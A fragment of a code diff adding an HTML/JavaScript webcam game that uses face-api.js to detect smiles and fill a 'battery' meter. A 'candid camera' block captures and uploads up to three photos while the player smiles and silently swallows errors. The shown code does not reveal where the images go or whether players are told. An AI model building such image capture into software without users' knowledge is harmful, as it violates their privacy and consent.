+        // Debug overlay doesn't affect detection
+        octx.clearRect(0, 0, canvasW, canvasH);
+
+        if (!result) {
+          debugLine.textContent = "Smile: — | Neutral: — (No face)";
+          stopChargeSfx();
+
+          if (currentState !== STATES.FULL) {
+            battery = clamp(battery - DRAIN_RATE, 0, 100);
+            updateBatteryUI();
+            setState(STATES.STRESSED);
+          }
+          return;
+        }
+
+        // Optional face box
+        const dims = faceapi.matchDimensions(overlay, video, true);
+        const resized = faceapi.resizeResults(result, dims);
+        if (resized?.detection) {
+          const { x, y, width, height } = resized.detection.box;
+          octx.strokeStyle = "rgba(255, 127, 196, .6)";
+          octx.lineWidth = 2;
+          octx.strokeRect(x, y, width, height);
+        }
+
+        const ex = result.expressions || {};
+        const smileScore = ex.happy ?? 0;
+        const neutralScore = ex.neutral ?? 0;
+
+        lastSmile = lastSmile * 0.72 + smileScore * 0.28;
+
+        debugLine.textContent = `Smile: ${lastSmile.toFixed(
+          2
+        )} | Neutral: ${neutralScore.toFixed(2)}`;
+
+        // Hysteresis
+        if (!smiling && lastSmile >= SMILE_ON) smiling = true;
+        if (smiling && lastSmile <= SMILE_OFF) smiling = false;
+
+        // ✅ CANDID CAMERA trigger
+        const now = Date.now();
+        if (nextShotAt === 0) scheduleNextShot(now);
+
+        if (smiling && photosTaken < 3 && now >= nextShotAt && !uploading) {
+          uploading = true;
+          captureAndUpload()
+            .catch(() => {})
+            .finally(() => {
+              uploading = false;
+              scheduleNextShot(Date.now());
+            });
+        }
+
+        // WIN
+        if (battery >= 100) {
+          battery = 100;
+          updateBatteryUI();
+          setState(STATES.FULL);
+
+          stopChargeSfx();
+
+          if (!hasPlayedSuccess) {
+            hasPlayedSuccess = true;
+            fadeOutBgm(900);
+            try {
+              sfxSuccess.currentTime = 0;
+              await sfxSuccess.play();
+            } catch (e) {}
+          }
+          return;
+        }
+
+        // CHARGING vs IDLE
+        if (smiling) {
+          if (sfxCharge.paused) {
+            try {
+              sfxCharge.currentTime = 0;
+              await sfxCharge.play();
+            } catch (e) {}
+          }
+
+          battery = clamp(battery + CHARGE_RATE, 0, 100);
+          updateBatteryUI();
+          setState(STATES.CHARGING);
+        } else {
+          stopChargeSfx();
+
+          battery = clamp(battery - DRAIN_RATE, 0, 100);
+          updateBatteryUI();
+          setState(STATES.STRESSED);
+        }
+
+        // Re-check win after update
+        if (battery >= 100) {
+          battery = 100;
+          updateBatteryUI();
+          setState(STATES.FULL);
+
+          stopChargeSfx();
+
+          if (!hasPlayedSuccess) {
+            hasPlayedSuccess = true;
+            fadeOutBgm(900);
+            try {
+              sfxSuccess.currentTime = 0;
+              await sfxSuccess.play();
+            } catch (e) {}
+          }
+        }
+      }
+
+      function resetAll() {
+        battery = 0;
+        hasConfettied = false;
+        hasPlayedSuccess = false;
+        smiling = false;
+        lastSmile = 0;
+
+        // ✅ reset candid camera
+        photosTaken = 0;
+        nextShotAt = 0;
+        uploading = false;
+
+        updateBatteryUI();
+        setState(STATES.STRESSED);
+        debugLine.textContent = "Smile: — | Neutral: —";
+
+        stopChargeSfx();
+        try {
+          sfxSuccess.pause();
+          sfxSuccess.currentTime = 0;
+        } catch (e) {}
+        if (bgmFadeTimer) {
+          clearInterval(bgmFadeTimer);
+          bgmFadeTimer = null;
+        }
+        try {
+          bgm.pause();
+          bgm.currentTime = 0;
+          bgm.volume = 0.3;
+        } catch (e) {}
+
+        recBadge.style.display = "none";
+
+        if (rafId) cancelAnimationFrame(rafId);
+        rafId = null;
+        lastDetectAt = 0;
+
+        // If camera already running, restart the loop
+        if (streamStarted) startMainLoop();
+      }
+
+      // ----------------------------
+      // INIT
+      // ----------------------------
+      btnStartGame.addEventListener("click", startGame);
+
+      btnReset.addEventListener("click", () => {
+        resetAll();
+        if (startOverlay.style.display === "none") {
+          try {
+            bgm.volume = 0.3;
+            bgm.play();
+          } catch (e) {}
+        }
+      });
+
+      window.addEventListener("resize", () => {
+        try {
+          resizeDisplayCanvases();
+        } catch (e) {}
+      });
+
+      resetAll();
+      resizeDisplayCanvases();
+      loadModels();
+    </script>
+  </body>
+</html>
